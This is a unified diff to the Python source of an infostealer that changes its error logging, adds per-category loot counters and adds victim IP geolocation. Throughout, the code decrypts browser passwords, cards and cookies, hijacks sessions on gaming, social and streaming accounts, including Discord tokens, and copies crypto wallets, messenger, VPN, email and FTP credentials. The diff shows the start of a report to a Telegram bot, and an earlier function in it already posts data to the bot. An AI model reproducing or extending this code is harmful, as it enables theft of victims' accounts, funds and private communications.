@@ -31,27 +31,18 @@ TOKEN = '%TOKEN%'
 CHAT_ID = '%CHAT_ID%'
 
 
-async def error_handler() -> None:
-
+def error_handler(error_message: str) -> None:
     hostname = platform.node()
     temp_dir = os.path.join(os.getenv('TEMP'), hostname)
 
     if not os.path.exists(temp_dir):
         os.makedirs(temp_dir)
 
-    exc_type, exc_value, exc_traceback = sys.exc_info()    
+    exc_message = error_message
     error_file_path = os.path.join(temp_dir, 'errors.txt')
 
     with open(error_file_path, 'a') as file:
-        file.write(f"Type : {exc_type.__name__}\n")
-        file.write(f"Message : {exc_value}\n")
-        tb = exc_traceback
-
-        while tb.tb_next:
-            tb = tb.tb_next
-
-        file.write(f"Fichier : {tb.tb_frame.f_code.co_filename}\n")
-        file.write(f"Ligne : {tb.tb_lineno}\n\n")
+        file.write(f"Message : {exc_message}\n\n")
         
 class ListFonction:
     Cards = list()
@@ -78,6 +69,14 @@ class ListFonction:
     SpotifyAccount = list()
     GuildedAccounts = list()
     PatreonAccounts = list()
+
+    PasswordManager = list()
+    WalletsCounts = list()
+    VpnsCounts = list()
+    Messengers = list()
+    MailsCounts = list()
+    GamesCounts = list()
+    FtpClient = list()
 
 class WindowsApi:
     @staticmethod
@@ -178,7 +177,8 @@ class get_data:
                     else:
                         self.profiles_full_path.extend(os.path.join(root, folder) for root, folders, _ in os.walk(directory) for folder in folders if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder)
 
-        except:
+        except Exception as e:
+            error_handler(f"list profiles error - {str(e)}")
             pass
 
     async def kill_browsers(self):
@@ -196,7 +196,8 @@ class get_data:
                             pid = parts[1]
                             process = await asyncio.create_subprocess_shell(f'taskkill /F /PID {pid}',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
                             await process.communicate()
-        except:
+        except Exception as e:
+            error_handler(f"kill browser error - {str(e)}")
             pass
 
     async def GetPasswords(self) -> None:
@@ -228,7 +229,8 @@ class get_data:
                 for login in logins:
                     if login[0] and login[1] and login[2]:
                         ListFonction.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {WindowsApi.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
-        except:
+        except Exception as e:
+            error_handler(f"get password error - {str(e)}")
             pass
     async def GetCards(self) -> None:
         try:
@@ -256,7 +258,8 @@ class get_data:
                         month = "0" + str(card[2])
                     else:month = card[2]
                     ListFonction.Cards.append(f"{WindowsApi.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
-        except:
+        except Exception as e:
+            error_handler(f"get card error - {str(e)}")
             pass 
     async def GetCookies(self) -> None:
         try:
@@ -314,7 +317,8 @@ class get_data:
                         twitch_cookie = None
                     if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():asyncio.create_task(self.StealRiotUser(dec_cookie, BrowserName))
 
-        except:
+        except Exception as e:
+            error_handler(f"get cookies error - {str(e)}")
             pass
 
     async def GetAutoFills(self) -> None:
@@ -334,8 +338,8 @@ class get_data:
                     cursor.close()
                     os.remove(copied_file_path)
                 except:pass  
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"get autofills error - {str(e)}")
 
 
 
@@ -359,8 +363,8 @@ class get_data:
             country = str(response.get("country", "No Country"))
             mfa = str(response.get("mfa", {}).get("verified", "No MFA Info"))
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"riot user error - {str(e)}")
         else:
             ListFonction.RiotGames.append(f"Username: {username}\nEmail: {email}\nRegion: {region}\nLocale: {locale}\nCountry: {country}\nMFA Verified: {mfa}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -409,8 +413,8 @@ class get_data:
             bits = data["data"]["user"]["bitsBalance"]
             followers = data["data"]["user"]["followers"]["totalCount"]            
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"twitch session error - {str(e)}")
         else:
             ListFonction.TwitchAccounts.append(f"ID: {idd}\nLogin: {login}\nDisplay Name: {displayName}\nEmail: {email}\nHas Prime: {hasPrime}\nIs Partner: {isPartner}\nLanguage: {lang}\nBits Balance: {bits}\nFollowers: {followers}\nProfile URL: {acc_url}\nBrowser: {browser}\nAuth Token: {auth_token}")
 
@@ -429,15 +433,13 @@ class get_data:
                     if response.status == 200:
                         data = await response.json()
                     else:
-                        await error_handler()
-                        return
+                        pass
 
                 async with session.get(url2, headers=headers) as response:
                     if response.status == 200:
                         data2 = await response.json()
                     else:
-                        await error_handler()
-                        return
+                        pass
 
             email = data["profile"]["email"]
             gender = data["profile"]["gender"]
@@ -455,8 +457,8 @@ class get_data:
 
             ListFonction.SpotifyAccount.append(f"Browser: {browser}\nEmail: {email}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nThird Party Email: {third}\nUsername: {username}\nIsTrial: {istrial}\nCurrentPlan: {plan}\nIsRecurring: {isrecurring}\nDaysLeft: {daysleft}\nIsSub: {sub}\nBilling Info: {billing}\nExpiry: {expiry}\n==============================================\n")
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"spotify session error - {str(e)}")
 
 
     async def StealReddit(self, cookie, browser: str) -> None:
@@ -478,8 +480,8 @@ class get_data:
                 gold = data2.get("is_gold", "No gold status")
                 suspended = data2.get("is_suspended", "No suspension status")
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"reddit session error - {str(e)}")
         else:
             ListFonction.RedditAccounts.append(f"Username: {username}\nEmail: {gmail}\nProfile URL: {profileUrl}\nComment Karma: {commentKarma}\nTotal Karma: {totalKarma}\nCoins: {coins}\nMod Status: {mod}\nGold Status: {gold}\nSuspended: {suspended}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -508,8 +510,8 @@ class get_data:
             url2 = req("url", "Couldn't get URL")
             social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections]) if non_null_social_connections else "No connections"
 
-        except Exception:
-            await error_handler()
+        except Exception as e: 
+            error_handler(f"patreon session error - {str(e)}")
         else:
             ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -536,8 +538,8 @@ class get_data:
             join = data["user"].get("joinDate", "Couldn't get join date")
             bio = data["user"]["aboutInfo"].get("tagLine", "Couldn't get user bio")
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"guilded session error - {str(e)}")
         else:
             ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -569,8 +571,8 @@ class get_data:
             followers = data2["user"].get("follower_count", 0)
             following = data2["user"].get("following_count", 0)
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"instagram session error - {str(e)}")
         else:
             ListFonction.InstagramAccounts.append(f"Username: {username}\nFull Name: {fullname}\nEmail: {email}\nIs Verified: {'Yes' if verify else 'No'}\nFollowers: {followers}\nFollowing: {following}\nBio: {bio}\nProfile URL: {profileURL}\nBrowser: {browser}\nCookie: {cookie}")
 
@@ -596,14 +598,14 @@ class get_data:
                     url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
                     data3 = await (await session.get(url3, headers=headers)).json()
                     subscriber = data3.get("total", "0")
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get tiktok subs error - {str(e)}")
                     subscriber = "0"
 
                 formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"tiktok session error - {str(e)}")
             pass
         else:
             ListFonction.TikTokAccounts.append(f"User ID: {user_id}\nUsername: {username}\nEmail: {email}\nPhone: {phone}\nCoins: {coins}\nCreated At: {formatted_date}\nSubscribers: {subscriber}\nBrowser: {browser}\nCookie: {cookie}\n")
@@ -636,8 +638,8 @@ class get_data:
                 description = req.get("description", "N/A")
                 profileURL = f"https://twitter.com/{nickname}"
             
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"twitter session error - {str(e)}")
         else:
             ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}")
     async def StealRoblox(self, cookie, browser) -> None:
@@ -672,8 +674,8 @@ class get_data:
                         return FullList
                     else:
                         raise ValueError("No 'data' key in the response.")
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get all roblox error - {str(e)}")
                     return []
 
             async def GetRAP(UserID):
@@ -702,8 +704,8 @@ class get_data:
                         if not data.get('nextPageCursor'):
                             Done = True
                                     
-                    except Exception:
-                        await error_handler()
+                    except Exception as e:
+                        error_handler(f"get roblox rap error - {str(e)}")
                         Done = True
                 return TotalValue
 
@@ -737,8 +739,8 @@ class get_data:
             seconds_passed = current_timestamp - creation_timestamp
             days_passed = round(seconds_passed / (24 * 60 * 60))
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"roblox session error - {str(e)}")
         else:
             ListFonction.RobloxAccounts.append(f"Cookie: {cookie}\nBrowser: {browser}\nUser: {username} ({userId})\nThumbail: {thumbnail}\nRobux: {robux}\nPremium: {premium}\nCreation Date: {creationDate} / {days_passed} Days!\nDescription: {description}\nBanned: {banned}\nRAP: {rap}\nFriends List: \n{friendlist}\n==============================================\n")
             
@@ -822,7 +824,7 @@ class get_data:
                                 dest_path = os.path.join(wallet_dir, file_name)
                                 shutil.copytree(wallet_path, dest_path)
                             except Exception:
-                                await error_handler()
+                                error_handler(f"wallet extension error - {str(e)}")
 
 
             for wallet_name, wallet_path in wallet_local_paths.items():
@@ -830,11 +832,11 @@ class get_data:
                     if os.path.exists(wallet_path):
                         dest_path = os.path.join(wallet_dir, wallet_name)
                         shutil.copytree(wallet_path, dest_path)
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"wallet dekstop error - {str(e)}")
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"wallets error - {str(e)}")
 
     async def StealTelegramSession(self, directory_path: str) -> None:
         try:
@@ -858,15 +860,15 @@ class get_data:
                                 shutil.copyfile(_path, os.path.join(copy_path, dirs))
                             elif os.path.isdir(_path):
                                 shutil.copytree(_path, os.path.join(copy_path, dirs))
-                    except Exception:
-                        await error_handler()
+                    except Exception as e:
+                        error_handler(f"copy telegram folders error - {str(e)}")
                         continue
 
                 if len(os.listdir(copy_path)) == 0:
                     os.rmdir(copy_path)
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"telegram error - {str(e)}")
             pass
 
 
@@ -892,8 +894,8 @@ class get_data:
                         os.makedirs(dest_folder, exist_ok=True)
                         shutil.copy(file, dest_folder)
                         
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"whatsapp error - {str(e)}")
             pass
 
     async def StealSkype(self, directory_path: str) -> None:
@@ -908,8 +910,8 @@ class get_data:
                 if len(os.listdir(copy_path)) == 0:
                     os.rmdir(copy_path)
                 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"skype error - {str(e)}")
             pass
 
     async def StealSignal(self, directory_path: str) -> None:
@@ -926,14 +928,14 @@ class get_data:
                         shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
                     if os.path.exists(Path(signal_path) / "config.json"):
                         shutil.copy(Path(signal_path) / "config.json", copied_path)
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"copy signal files error - {str(e)}")
                     pass
                 if len(os.listdir(copied_path)) == 0:
                     os.rmdir(copied_path)
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"signal error - {str(e)}")
             pass
  
     async def StealElement(self, directory_path: str) -> None:
@@ -952,8 +954,8 @@ class get_data:
                     if os.path.exists(local_storage_src):
                         shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
                     found_element = True
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"copy element files error - {str(e)}")
                     pass
                 if found_element:
                     os.mkdir(os.path.join(copied_path, "How to Use"))
@@ -961,8 +963,8 @@ class get_data:
                         write_file.write("First, open this file path on your computer <%appdata%\\Element>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Element")
                 if len(os.listdir(copied_path)) == 0:
                     os.rmdir(copied_path)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"element error - {str(e)}")
             pass 
    
     async def StealViber(self, directory_path: str) -> None:
@@ -994,8 +996,8 @@ class get_data:
                         write_file.write("First, open this file path on your computer <%appdata%\\ViberPC>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Viber")
                 if len(os.listdir(copied_path)) == 0:
                     os.rmdir(copied_path)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"viber error - {str(e)}")
             pass
   
 
@@ -1011,8 +1013,8 @@ class get_data:
                     shutil.copy2(pidgin_folder, pidgin_accounts)
                 if len(os.listdir(pidgin_accounts)) == 0:
                     os.rmdir(pidgin_accounts)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"pidgin error - {str(e)}")
             pass
 
     async def StealTox(self, directory_path: str) -> None:
@@ -1028,8 +1030,8 @@ class get_data:
                         shutil.copy2(item, tox_session)
                 if len(os.listdir(tox_session)) == 0:
                     os.rmdir(tox_session)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"tox error - {str(e)}")
             pass
 
     async def StealProtonVPN(self, directory_path: str) -> None:
@@ -1050,8 +1052,8 @@ class get_data:
                     shutil.copytree(directory, destination_path, dirs_exist_ok=True)
                 else:
                     shutil.copy2(directory, destination_path)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"proton error - {str(e)}")
             pass
 
     async def StealSurfsharkVPN(self, directory_path: str) -> None:
@@ -1067,13 +1069,13 @@ class get_data:
                 for file in files:
                     if file in files_to_copy:
                         shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"surfshark error - {str(e)}")
             pass
 
     async def StealOpenVPN(self, directory_path: str) -> None:
         try:
-            openvpn_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'OpenVPN Connect')
+            openvpn_folder = os.path.join(self.appdata, 'OpenVPN Connect')
             if not os.path.isdir(openvpn_folder):
                 return
             
@@ -1091,16 +1093,16 @@ class get_data:
                 shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
             else:
                 shutil.copy2(Path(config_src), openvpn_accounts)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"openvpn error - {str(e)}")
             pass
 
     async def DecryptNordVPN(self, encrypted) -> None:
         try:
             encrypted_data = base64.b64decode(encrypted)
             return WindowsApi.CryptUnprotectData(encrypted_data).decode('utf-8')
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"decrypt nordvpn error - {str(e)}")
             return ""
 
     async def StealNordVPN(self, driectory_path):
@@ -1134,8 +1136,8 @@ class get_data:
 
                     with open(os.path.join(vpn_version_path, "nordvpn_account.txt"), "a") as file:
                         file.write(f"Username: {username}\nPassword: {password}\n\n")
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"nordvpn error - {str(e)}")
             pass
 
     async def BackupThunderbird(self, directory_path: str) -> None:
@@ -1166,8 +1168,8 @@ class get_data:
                             shutil.copytree(file, dest_file_path, dirs_exist_ok=True)
                         else:
                             shutil.copy2(file, dest_file_path)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"backupthunderbird error - {str(e)}")
             pass
 
 
@@ -1185,8 +1187,8 @@ class get_data:
             else:
                 shutil.copy2(Path(store_db), mailbird_db)
     
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"backupmailbird error - {str(e)}")
             pass
 
     async def DecryptOutlook(encrypted_value) -> None:
@@ -1201,7 +1203,8 @@ class get_data:
                 decrypted_data = ctypes.cast(data_out, ctypes.POINTER(ctypes.c_ubyte))
                 length = ctypes.windll.kernel32.LocalSize(data_out)
                 return bytes(bytearray([decrypted_data[i] for i in range(length)])).decode("utf-8").replace("\x00", "")
-        except:
+        except Exception as e:
+            error_handler(f"decrypt outlook error - {str(e)}")
             return "null"
 
     async def get_info_from_registry(self, path, value_name) -> None:
@@ -1211,6 +1214,7 @@ class get_data:
             reg.CloseKey(registry_key)
             return value
         except Exception as e:
+            error_handler(f"get info from registry error - {str(e)}")
             return None
 
     async def StealOutlook(self, directory_path) -> None:
@@ -1256,8 +1260,8 @@ class get_data:
                     elif value:
                         decoded_value = value.decode("utf-8").replace("\x00", "")
                         data += f"{client}: {decoded_value}\r\n"
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get data from reg error - {str(e)}")
                     pass
 
             with reg.OpenKey(reg.HKEY_CURRENT_USER, path) as key:
@@ -1266,8 +1270,8 @@ class get_data:
                     subkey_name = reg.EnumKey(key, i)
                     data += await self.get_data_from_registry(f"{path}\\{subkey_name}", clients, mail_client_regex, smtp_client_regex)
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"get data from registry error - {str(e)}")
             pass
 
         return data
@@ -1313,8 +1317,8 @@ class get_data:
                 
             if len(os.listdir(filezilla_hosts)) == 0:
                 os.rmdir(filezilla_hosts)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"filezilla error - {str(e)}")
             pass
 
 
@@ -1370,23 +1374,23 @@ class get_data:
                         except OSError:
                             break
                         index += 1
-            except OSError:
-                await error_handler()
+            except OSError as e:
+                error_handler(f"os error winscp error - {str(e)}")
 
             with open(output_path, 'w') as file:
                 file.write(output)
 
         except OSError:
-            await error_handler()
-        except Exception:
-            await error_handler()
+            error_handler(f"all os error winscp - {str(e)}")
+        except Exception as e:
+            error_handler(f"winscp error - {str(e)}")
 
 
     async def StealPutty(self, directory_path: str) -> None:
         try:
             database_path = self.get_default_database()
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"get default database putty error - {str(e)}")
             return
 
         full_path = os.path.join(directory_path, "FTP Clients", "Putty", database_path)
@@ -1395,7 +1399,7 @@ class get_data:
             pwd_found = await self.parse_xml(full_path)
             await self.save_to_file(pwd_found, directory_path)
         else:
-            await error_handler()
+            pass
 
     def get_default_database(self) -> str:
         access_read = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
@@ -1419,8 +1423,8 @@ class get_data:
                     pwd_found.append(values)
 
             return pwd_found
-        except ET.ParseError:
-            await error_handler()
+        except ET.ParseError as e:
+            error_handler(f"putty parse xml error - {str(e)}")
             return []
 
     async def save_to_file(self, data: list, directory_path: str) -> None:
@@ -1431,8 +1435,8 @@ class get_data:
                     for key, value in entry.items():
                         file.write(f"{key}: {value}\n")
                     file.write("\n")
-        except IOError:
-            await error_handler()
+        except IOError as e:
+            error_handler(f"ioerror putty save to file - {str(e)}")
             pass
 
     async def StealPasswordManagers(self, directory_path: str) -> None:
@@ -1483,8 +1487,8 @@ class get_data:
                                         loc_file.write(f"Copied {password_manager} from {extension_path} to {password_dir_path}")
             if len(os.listdir(password_dir_path)) == 0:
                 os.rmdir(password_dir_path)
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"password manager error - {str(e)}")
 
 
 
@@ -1534,8 +1538,8 @@ class get_data:
                         uhq.append(f"[{guild['name']}]({f'https://discord.gg/{link}' if link else ''}) ({guild['id']}) {guild['approximate_member_count']} Members")
 
                     return '\n'.join(uhq) if uhq else "No HQ Guilds"
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"uhqguild error - {str(e)}")
                     return "No HQ Guilds"
 
 
@@ -1567,8 +1571,8 @@ class get_data:
                         if OwnedBadges != '':
                             uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
                     return uhqlist if uhqlist != '' else "No HQ Friends"
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"uhq firends error - {str(e)}")
 
             def GetBadge(flags):
                 if flags == 0:
@@ -1634,8 +1638,8 @@ class get_data:
                         phone = f'`{user_info["phone"]}`'
 
                     return username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitros, phone
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"token info error - {str(e)}")
 
 
             async def CheckToken(token) -> bool:
@@ -1653,8 +1657,8 @@ class get_data:
                                 return False
                             else:
                                 return True
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"check token error - {str(e)}")
                     return False
 
             async def GetBilling(token):
@@ -1672,8 +1676,8 @@ class get_data:
                                 response_text = await response.text()
                                 billing_json = json.loads(response_text)
 
-                    except Exception:
-                        await error_handler()
+                    except Exception as e:
+                        error_handler(f"get billing url error - {str(e)}")
                         return False
                     
                     if not billing_json:
@@ -1689,8 +1693,8 @@ class get_data:
                             elif method["type"] == 17:
                                 billing += "CashApp "
                     return billing
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get billing error - {str(e)}")
 
             async def GetBack() -> None:
                 try:
@@ -1702,8 +1706,8 @@ class get_data:
                             
                         return backup
                             
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get backup discord code - {str(e)}")
                     return 'No backup code saved'
                 
             async def GetDiscordConnection(token) -> None:
@@ -1747,8 +1751,8 @@ class get_data:
                                 return connections_list
                             else:
                                 return []
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"discord connections error - {str(e)}")
         
             async def GetGift(token) -> None:
                 try:
@@ -1768,8 +1772,8 @@ class get_data:
                                     return 'No Gift'
                             else:
                                 return 'No Gift'
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get gifts error - {str(e)}")
             processed_tokens = []
             processed_id = []
             async def UploadToken(token, path) -> None:
@@ -1808,8 +1812,8 @@ class get_data:
                     if hashtag == '0':
                         hashtag = ''
                     
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"upload token error - {str(e)}")
                 else:
                     ListFonction.discord.append(f"Token: {token}\nPath: {path}\nUser: {username}#{hashtag} ({user_id}) Global Username : {globalusername}\nPhone: {phone}\nEmail: {email}\nNsfw Enable?: {nsfw}\nBadge: {nitro}{badge}\nBilling: {billing}\nBiography: {bio}\nHQ Friends: {friends}\nGuilds: {guild}\nConnection: {connections_str}\nGift: {gift}\nBackup Code: {back}\n==============================================\n")
 
@@ -1833,8 +1837,8 @@ class get_data:
                                                     tokens.append(token)
                                                     await UploadToken(token, path)
 
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get token error - {str(e)}")
 
             async def GetDiscord(path, arg):
                 try:
@@ -1857,8 +1861,8 @@ class get_data:
                                                 tokens.append(TokenDecoded)
                                                 await UploadToken(TokenDecoded, path)
 
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"get discord error - {str(e)}")
 
             browserPaths = [        
                 [f"{self.RoamingAppData}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -1888,11 +1892,11 @@ class get_data:
                     await GetToken(patt[0], patt[2])
                 for patt in discordPaths:
                     await GetDiscord(patt[0], patt[1])
-            except Exception:
-                await error_handler()
+            except Exception as e:
+                error_handler(f"run browser & token error - {str(e)}")
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"discord error - {str(e)}")
 
 
 
@@ -1942,8 +1946,8 @@ class get_data:
 
                                 ListFonction.SteamUserAccounts.append(f"Real Name: {realname}\nPerson Name: {personname}\nProfile URL: {profileurl}\nCreation Date: {creation_date}\nPlayer Level: {level}\nTotal games: {total_games}\n")
                                 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"steam user error - {str(e)}")
 
 
     async def StealUbisoft(self, directory_path: str) -> None:
@@ -1959,8 +1963,8 @@ class get_data:
                         shutil.copy(name_of_files, os.path.join(copied_path, file))
                     except:
                         continue
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"ubisoft error - {str(e)}")
             pass
 
     async def StealEpicGames(self, directory_path: str) -> None:
@@ -1975,8 +1979,8 @@ class get_data:
                 except:
                     pass
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"epicgames error - {str(e)}")
             pass
 
     async def StealGrowtopia(self, directory_path: str) -> None:
@@ -1985,8 +1989,8 @@ class get_data:
             copied_path = os.path.join(directory_path, "Games", "Growtopia")
             if os.path.isfile(growtopia_path):
                 shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"growtopia error - {str(e)}")
             pass
 
     async def StealSteamFiles(self, directory_path: str) -> None:
@@ -1998,8 +2002,8 @@ class get_data:
                 if not os.path.isdir(to_path):
                     os.mkdir(to_path)
                 shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"steamfiles error - {str(e)}")
             return "null"
         
     
@@ -2028,13 +2032,13 @@ class get_data:
                                 os.makedirs(destination_dir, exist_ok=True)
 
                                 shutil.copy(file_path, os.path.join(destination_dir, file))
-                            except Exception:
-                                await error_handler()
+                            except Exception as e:
+                                error_handler(f"get battlenet files error - {str(e)}")
                                 return
 
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"battlenet error - {str(e)}")
             pass
 
 
@@ -2205,19 +2209,37 @@ class get_data:
             ]
             
             await asyncio.gather(*tasks)
+
+            count_folders_in = {
+                "Messenger": len(os.listdir(os.path.join(filePath, "Messenger"))),
+                "VPN": len(os.listdir(os.path.join(filePath, "VPN"))),
+                "Email": len(os.listdir(os.path.join(filePath, "Email"))),
+                "Wallets": len(os.listdir(os.path.join(filePath, "Wallets"))),
+                "FTP Clients": len(os.listdir(os.path.join(filePath, "FTP Clients"))),
+                "Games": len(os.listdir(os.path.join(filePath, "Games"))),
+                "PasswordManager": len(os.listdir(os.path.join(filePath, "PasswordManager"))),
+            }
+
+            ListFonction.Messengers.append(str(count_folders_in["Messenger"]))
+            ListFonction.VpnsCounts.append(str(count_folders_in["VPN"]))
+            ListFonction.MailsCounts.append(str(count_folders_in["Email"]))
+            ListFonction.WalletsCounts.append(str(count_folders_in["Wallets"]))
+            ListFonction.FtpClient.append(str(count_folders_in["FTP Clients"]))
+            ListFonction.GamesCounts.append(str(count_folders_in["Games"]))
+            ListFonction.PasswordManager.append(str(count_folders_in["PasswordManager"]))
             
-            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games"]
+            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games", "Password Managers"]
             
             for folder in folders_to_check:
                 try:
                     if len(os.listdir(os.path.join(filePath, folder))) == 0:
                         shutil.rmtree(os.path.join(filePath, folder))
-                except Exception:
-                    await error_handler()
+                except Exception as e:
+                    error_handler(f"remove empty folder error - {str(e)}")
 
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"insidefolder error - {str(e)}")
 
     async def SendKeyWords(self) -> None:
         try:
@@ -2258,8 +2280,8 @@ class get_data:
                 async with session.post(send, data=message_payload) as response:
                     pass
 
-        except Exception:
-            await error_handler()
+        except Exception as e:
+            error_handler(f"send keywords error - {str(e)}")
 
     async def SendAllData(self) -> None:
         try:
@@ -2267,31 +2289,64 @@ class get_data:
 
             filePath = os.path.join(self.temp, hostname)
             shutil.make_archive(filePath, "zip", filePath)
+            system_info = platform.uname()
 
-            text = f"""
-<b>👤  <i><u>{platform.node()} - Files Counts</u></i></b>
+            ip_info_url = "https://ipinfo.io/json"
+            ip_info_response = requests.get(ip_info_url)
+            ip_info_data = ip_info_response.json()
+
+            public_ip = ip_info_data.get("ip")
+            region = ip_info_data.get("region")
+            country = ip_info_data.get("country")
+            location = ip_info_data.get("loc", "").split(",")
+            latitude = location[0] if len(location) > 0 else "Unknown"
+            longitude = location[1] if len(location) > 1 else "Unknown"
+            google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
+
+
+            text += f"""
+<b>👤  <i><u>{hostname} - All Info</u></i></b>
+
+<b><i><u>System Info</u></i></b>
+
+<b>Computer Name:</b>\t<code>{system_info.node}</code>
+<b>Computer Hostname:</b>\t<code>{hostname}</code>
+<b>Computer OS:</b>\t<code>{system_info.system} {system_info.release} {system_info.version}</code>
+<b>Total Memory:</b>\t<code>{system_info.machine}</code>
+<b>CPU:</b>\t<code>{system_info.processor}</code>
+
+<b><i><u>IP Info</u></i></b>
+<b>IP Address:</b>\t<code>{public_ip}</code>
+<b>Region:</b>\t<code>{region}</code>
+<b>Country:</b>\t<code>{country}</code>
+<b>Google Maps Location:</b>\t<a href="{google_maps_link}">View on Google Maps</a>
 
 <b><i><u>Browser</u></i></b>
-<b>Cards:</b> <code>{str(len(ListFonction.Cards))}</code>
-<b>Passwords:</b> <code>{str(len(ListFonction.Passwords))}</code>
